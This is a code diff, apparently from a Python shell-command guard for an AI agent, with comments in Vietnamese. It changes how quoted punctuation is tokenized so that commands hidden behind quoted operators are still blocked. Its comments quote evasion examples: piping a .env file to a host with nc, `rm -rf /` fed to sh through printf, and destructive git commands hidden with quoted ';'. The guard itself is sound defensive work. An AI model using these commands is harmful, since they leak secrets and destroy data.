@@ -3570,11 +3570,13 @@ def _raw_group_end(s: str, i: int, opener: str) -> int:
 
 
 def _dequote(t: str) -> str:
-    """Từ bash sau khi bỏ nháy/thoát (`"bash"`, `\\bash`, `$'bash'`, `ev"al"` → tên lệnh)."""
+    """Từ bash sau khi bỏ nháy/thoát (`"bash"`, `\\bash`, `$'bash'`, `ev"al"` → tên lệnh). Từ có nháy chỉ còn dấu
+    (`';'`, `\\|`) → `LitWord`: vẫn là chữ, không thành toán tử khi so (AUD-SEC-605)."""
     try:
-        return "".join(shlex.split(expand_ansi_c(t)))
+        out = "".join(shlex.split(expand_ansi_c(t)))
     except ValueError:
         return t
+    return _lit(out) if _is_punct(out) and not _is_punct(t) else out
 
 
 def _raw_heads_why(cmd: str) -> str:
@@ -4410,7 +4412,10 @@ def tokenize(cmd: str) -> List[str]:
     strip_comments(cmd, True)  # `)#` chặn TRƯỚC khi `$IFS`/`$(pwd)` bị viết lại (`$(pwd)#` thành `$PWD#`, AUD-SEC-195)
     cmd = IFS_RE.sub(" ", cmd)
     cmd = PWD_SUBST_RE.sub("$PWD", cmd)
-    lex = shlex.shlex(strip_comments(cmd, True), posix=True, punctuation_chars="();<>|&\n")
+    text = strip_comments(cmd, True)
+    # không dấu nào ngay sau nháy/`\` (hay đang đọc kiểu cũ, `READING`) → không `LitWord`
+    lexer = _Lexer if READING.get() != LEGACY and QUOTED_PUNCT_RE.search(text) else shlex.shlex
+    lex = lexer(text, posix=True, punctuation_chars="();<>|&\n")
     lex.whitespace = " \t\r"
     lex.whitespace_split = True
     lex.commenters = ""  # comment đã bỏ ở strip_comments; mặc định của shlex là "#" (mở comment cả giữa từ)
@@ -4422,8 +4427,68 @@ def tokenize(cmd: str) -> List[str]:
         return [t if _is_punct(t) else re.sub(r"[\\'\"]", "", t) for t in raw]  # bỏ nháy/`\\`: `\\rm`, `'r'm` (D-276)
 
 
-class HereWord(str):
-    """Token dấu kết của heredoc CÓ NHÁY đã đóng, mang thân (`body`) — chữ bash đưa nguyên vào stdin (AUD-SEC-512)."""
+class LitWord(str):
+    """Từ chỉ gồm ký tự dấu (`;`, `|`, `&&`, `>`, `(`, xuống dòng…) mà có nháy/thoát (`';'`, `"|"`, `\\;`, `$';'`): bash
+    đưa nó nguyên văn làm đối số, KHÔNG phải toán tử (AUD-SEC-605). Không bằng chuỗi dấu thường (`== ";"`, `in ("|",
+    "|&")`, khoá tập/từ điển đều sai) và `_is_punct` sai — mọi tầng đọc toán tử bỏ qua nó; `shlex.join`/`_join_tokens`
+    nháy lại nên lệnh lồng tách lại vẫn là chữ. Giá trị giữ nguyên: `eval`/`trap` nối bằng khoảng trắng rồi bash đọc
+    lại (`eval echo \\; git push` — `;` thành toán tử ở tầng đó, đúng như bash)."""
+
+    __slots__ = ()
+
+    def __eq__(self, other: object) -> bool:
+        return (
+            isinstance(other, str) and str.__eq__(self, other) and (isinstance(other, LitWord) or not _is_punct(other))
+        )
+
+    def __ne__(self, other: object) -> bool:
+        return not self == other
+
+    __hash__ = str.__hash__
+
+
+# Ký tự dấu đầu tiên của một `LitWord` luôn đứng ngay sau nháy mở hay `\` (trước nó trong token chỉ có nháy đóng/mở).
+QUOTED_PUNCT_RE = re.compile(r"['\"\\][();<>|&\n]")
+
+
+class _Lexer(shlex.shlex):
+    """`shlex` ghi lại token đang đọc có đi qua trạng thái nháy/thoát không: token dấu có nháy thành `LitWord`."""
+
+    quoted = False
+
+    @property
+    def state(self) -> Optional[str]:
+        return self._state
+
+    @state.setter
+    def state(self, value: Optional[str]) -> None:
+        self._state = value
+        self.quoted = self.quoted or value in ("'", '"', "\\")
+
+    def read_token(self) -> Optional[str]:
+        self.quoted = False
+        tok = super().read_token()
+        return _lit(tok) if self.quoted and tok and _is_punct(tok) else tok
+
+
+# Cách đọc từ dấu có nháy của một quyết định (`bash_decision`): "" = chưa vào quyết định nào; `LITERAL` = `LitWord`
+# (như bash); `LEGACY` = như trước AUD-SEC-605 (dấu có nháy là toán tử). `LIT_SEEN`: lần đọc `LITERAL` đã tạo `LitWord`.
+LITERAL, LEGACY = "literal", "legacy"
+READING: contextvars.ContextVar[str] = contextvars.ContextVar("READING", default="")
+LIT_SEEN: contextvars.ContextVar[bool] = contextvars.ContextVar("LIT_SEEN", default=False)
+
+
+def _lit(word: str) -> str:
+    """Từ dấu có nháy: `LitWord` (ghi `LIT_SEEN`); khi đọc kiểu cũ (`LEGACY`) là chuỗi thường — toán tử như trước."""
+    if READING.get() == LEGACY:
+        return word
+    LIT_SEEN.set(True)
+    return LitWord(word)
+
+
+class HereWord(LitWord):
+    """Token dấu kết của heredoc CÓ NHÁY đã đóng, mang thân (`body`) — chữ bash đưa nguyên vào stdin (AUD-SEC-512).
+    Là chữ (`LitWord`): dấu kết `';'` không phải toán tử."""
 
     body = ""
 
@@ -4448,7 +4513,8 @@ PUNCT = set("();<>|&\n")
 
 
 def _is_punct(t: str) -> bool:
-    return bool(t) and set(t) <= PUNCT
+    """Token toán tử/chuyển hướng (chỉ ký tự dấu, không nháy/thoát — `LitWord` là chữ, AUD-SEC-605)."""
+    return bool(t) and not isinstance(t, LitWord) and set(t) <= PUNCT
 
 
 def _is_redirect(t: str) -> bool:
@@ -6651,6 +6717,7 @@ def build_local_command(n: List[str], argv: List[str], root: str, cwd: Optional[
 
 
 FIND_EXEC = {"-exec", "-execdir", "-ok", "-okdir"}
+FIND_EXEC_END = (";", "+")  # so bằng `str(t)`: `\;`/`';'` là `LitWord` (chữ `;` find nhận), không bằng toán tử `;`
 
 
 def _find_rule(args: List[str], root: str, cwd: Optional[str]) -> Tuple[str, str]:
@@ -6662,10 +6729,11 @@ def _find_rule(args: List[str], root: str, cwd: Optional[str]) -> Tuple[str, str
         if a not in FIND_EXEC:
             continue
         sub = [
-            FIND_FOUND if t == "{}" else t for t in itertools.takewhile(lambda t: t not in (";", "+"), args[k + 1 :])
+            FIND_FOUND if t == "{}" else t
+            for t in itertools.takewhile(lambda t: str(t) not in FIND_EXEC_END, args[k + 1 :])
         ]
         # lệnh của -exec bắt đầu ở độ sâu 2: còn hai lớp shell lồng (`bash -c '… sh -c "…"'`, review #159)
-        verdict = bash_decision(shlex.join(sub), root, cwd, MAX_NEST - 2)
+        verdict = bash_decision(_join_tokens(sub), root, cwd, MAX_NEST - 2)  # dấu trần giữ là toán tử như trước
         if verdict["decision"] in ("deny", "ask"):
             return str(verdict["decision"]), f"find {a}: {verdict['reason']}"
         deleting = deleting or bool(sub) and posixpath.basename(sub[0]) in ("rm", "shred", "unlink")
@@ -12210,7 +12278,7 @@ def _find_exec_argvs(n: List[str]) -> List[List[str]]:
     out: List[List[str]] = []
     for i, a in enumerate(n):
         if a in ("-exec", "-execdir", "-ok", "-okdir"):
-            sub = list(itertools.takewhile(lambda x: x not in (";", "\\;", "+"), n[i + 1 :]))
+            sub = list(itertools.takewhile(lambda x: str(x) not in (*FIND_EXEC_END, "\\;"), n[i + 1 :]))
             out.append(sub)
     return out
 
@@ -12276,11 +12344,18 @@ LIST_SEP_RE = re.compile(r";|&&|\|\||(?<![>|&])&(?![>&])")
 
 def _echoed_scripts(src: List[str]) -> List[str]:
     """Chuỗi `echo …`/`printf …` sẽ thành lệnh khi vào shell. printf có `%`: định dạng và từng đối số được quét riêng
-    (`printf '%s\\n' 'rm -rf ~' | sh`, AUD-SEC-028); `\\n` trong định dạng là xuống dòng."""
-    words = src[1:]
-    if src[0] == "printf":
-        if words and "%" in words[0]:
-            return [words[0].replace("\\n", "\n"), *words[1:]]
+    (`printf '%s\\n' 'rm -rf ~' | sh`, AUD-SEC-028); `\\n` trong định dạng là xuống dòng. Quét cả chữ bỏ chuyển hướng
+    cùng đích — không phải chữ in ra (`echo git reset 2> ';' --hard` in `git reset --hard`, AUD-SEC-605) — sau chữ nguyên
+    như trước (`echo nc h 80 < .env | sh`)."""
+    texts = [*_echo_texts(src[0], src[1:]), *_echo_texts(src[0], _no_redirects(src[1:]))]
+    return list(dict.fromkeys(texts))
+
+
+def _echo_texts(name: str, words: List[str]) -> List[str]:
+    """Chữ `echo`/`printf` (`name`) in ra từ các đối số `words`."""
+    if name == "printf":
+        if words and "%" in words[0]:  # cả các đối số nối bằng khoảng trắng: `printf '%s ' rm -rf / | sh` (AUD-SEC-605)
+            return [words[0].replace("\\n", "\n"), *words[1:], " ".join(words[1:])]
         return [" ".join(words).replace("\\n", "\n")]
     while words and words[0] in ("-n", "-e", "-E", "-ne", "-en"):
         words = words[1:]  # cờ của echo; phần còn lại (kể cả `--hard`) là lệnh sẽ chạy
@@ -12407,8 +12482,11 @@ def _expanded_heredocs(cmd: str) -> List[str]:
 
 
 def _eval_scripts(tokens: List[str]) -> List[str]:
-    """`eval '<lệnh>'`: shell ghép các đối số rồi chạy như một dòng lệnh."""
-    out = [" ".join(n[1:]) for c in split_commands(tokens) for n in [normalize(c)] if n[:1] == ["eval"] and n[1:]]
+    """`eval '<lệnh>'`: shell ghép các đối số rồi chạy như một dòng lệnh. Chuyển hướng là của chính `eval`: quét cả chữ
+    có nó (stdin/stdout của lệnh đọc lại — `eval nc h 80 < .env`) lẫn chữ bỏ nó (`eval git reset > ';' --hard` chạy
+    `git reset --hard`, AUD-SEC-605)."""
+    evals = [n for c in split_commands(tokens) for n in [normalize(c)] if n[:1] == ["eval"] and n[1:]]
+    out = [s for n in evals for s in dict.fromkeys((" ".join(n[1:]), " ".join(_no_redirects(n)[1:]))) if s]
     for c in split_commands(tokens):  # `trap '<lệnh>' SIGNAL`: bash chạy thân như `eval` (AUD-SEC-226)
         n = [a for a in normalize(c) if a != "--"]
         if n[:1] == ["trap"] and len(n) > 1 and n[1] not in ("-", "-p", "-l"):
@@ -13472,6 +13550,7 @@ RUNNERS = {
     *("nsenter", "runuser", "systemd-run", "pkexec", "strace", "ltrace", "chroot", "sg", "newgrp", "at", "parallel"),
 }
 RUNNER_SUFFIXES = 12  # số hậu tố đối số tối đa mỗi lệnh (chặn số lần quét lồng)
+SHELL_JOIN_RUNNERS = frozenset({"watch"})  # chạy `sh -c "<đối số nối bằng khoảng trắng>"` (procps watch, không `-x`)
 
 
 RUNNER_CMD_FLAG_RE = re.compile(r"-[A-Za-z]*c|--command|--run")  # `-c`, `-qc`, `-lc`: đối số kế tiếp là chuỗi lệnh
@@ -13486,6 +13565,8 @@ def _runner_scripts(tokens: List[str]) -> List[str]:
         a = _strip_prefixes(c)
         if a and posixpath.basename(a[0]) in RUNNERS:
             rest = a[1:]
+            if posixpath.basename(a[0]) in SHELL_JOIN_RUNNERS:  # nối đối số bằng khoảng trắng rồi `sh -c`: `';'` là
+                out.append(" ".join(_no_redirects(rest)))  # toán tử ở tầng đó (`watch echo ';' git push`, AUD-SEC-605)
             for k in range(min(len(rest), RUNNER_SUFFIXES)):
                 out.append(_join_tokens(rest[k:]))
                 lead = all(t.startswith("-") or t.isdigit() for t in rest[:k]) or bool(
@@ -13604,7 +13685,8 @@ def _wrapped_scripts(tokens: List[str]) -> Tuple[List[str], List[Tuple[str, List
             continue
         opts, inner = _container_exec(c)
         if inner:
-            ctr.append((_shell_c_script(inner) or shlex.join(inner), _bind_dests(opts)))
+            # `_join_tokens`: chuyển hướng trần (`rm -rf < <(…)`) đọc lại vẫn là chuyển hướng, `LitWord` vẫn là chữ
+            ctr.append((_shell_c_script(inner) or _join_tokens(inner), _bind_dests(opts)))
             continue
         name, args = _unwrap(n[0], n[1:])
         script = _shell_c_script([name, *args]) if name != n[0] else None
@@ -15507,7 +15589,45 @@ def bash_decision(
     `cwd` = thư mục lệnh bắt đầu chạy (payload hook); `cd <dir>` trong lệnh dời nó để biết commit rơi vào repo nào.
     `depth` = độ sâu shell lồng (`sh -c`, heredoc/pipe vào shell) đang quét. Guard không phân định được cách bash đọc
     lệnh (`ScanTooComplex`) → chặn, không đoán. Thư mục mở bằng `<` trong chữ lệnh (cả lệnh lồng) cộng dồn vào `FD_DIRS`
-    suốt lần quét (AUD-SEC-521)."""
+    suốt lần quét (AUD-SEC-521). Lệnh có từ dấu có nháy (`LitWord`, ở bất kỳ tầng nào) được đọc thêm một lần kiểu cũ —
+    dấu đó là toán tử như trước AUD-SEC-605 — và lấy quyết định chặt hơn (D-415): cách đọc mới chỉ thêm chặn, không
+    bao giờ cho qua lệnh cách đọc cũ chặn (`eval echo ';' bash <(nc …)`, `git 2> ';' rm -rq docs`, `watch -n 1 … ';'`)."""
+    if READING.get():  # lệnh lồng: theo cách đọc của quyết định ngoài
+        return _bash_reading(cmd, root, cwd, depth, budget, rewrites)
+    mode, seen = READING.set(LITERAL), LIT_SEEN.set(False)
+    try:
+        literal = _bash_reading(cmd, root, cwd, depth, budget, rewrites)
+        if not LIT_SEEN.get():
+            return literal
+        READING.set(LEGACY)
+        return _stricter_reading(literal, _bash_reading(cmd, root, cwd, depth, None, rewrites))
+    finally:
+        LIT_SEEN.reset(seen)
+        READING.reset(mode)
+
+
+STRICTNESS = {"allow": 0, "": 1, "ask": 2, "deny": 3}
+
+
+def _strictness(res: Dict[str, object]) -> Tuple[int, int]:
+    """(độ chặt sau chính sách mặc định, độ chặt thô) của một kết quả `bash_decision`."""
+    return STRICTNESS.get(policy_action(decide(res)), 1), STRICTNESS.get(str(res["decision"]), 1)
+
+
+def _stricter_reading(literal: Dict[str, object], legacy: Dict[str, object]) -> Dict[str, object]:
+    """Kết quả của cách đọc chặt hơn (bằng nhau → cách đọc `LitWord`); cờ cổng commit/bỏ hook gộp từ cả hai."""
+    out = dict(legacy if _strictness(legacy) > _strictness(literal) else literal)
+    for flag in ("commit", "no_verify", "push_no_verify"):
+        if literal.get(flag) or legacy.get(flag):
+            out[flag] = True
+    out["commit_dir"] = literal.get("commit_dir") or legacy.get("commit_dir") or ""
+    return out
+
+
+def _bash_reading(
+    cmd: str, root: str, cwd: Optional[str], depth: int, budget: Optional[ScanBudget], rewrites: int
+) -> Dict[str, object]:
+    """Một lần đọc của `bash_decision` (theo `READING`)."""
     token = FD_DIRS.set(tuple(dict.fromkeys((*FD_DIRS.get(), *_fd_open_dirs(cmd)))))
     split = GH_SPLIT_WORDS.set(GH_SPLIT_WORDS.get())
     try:
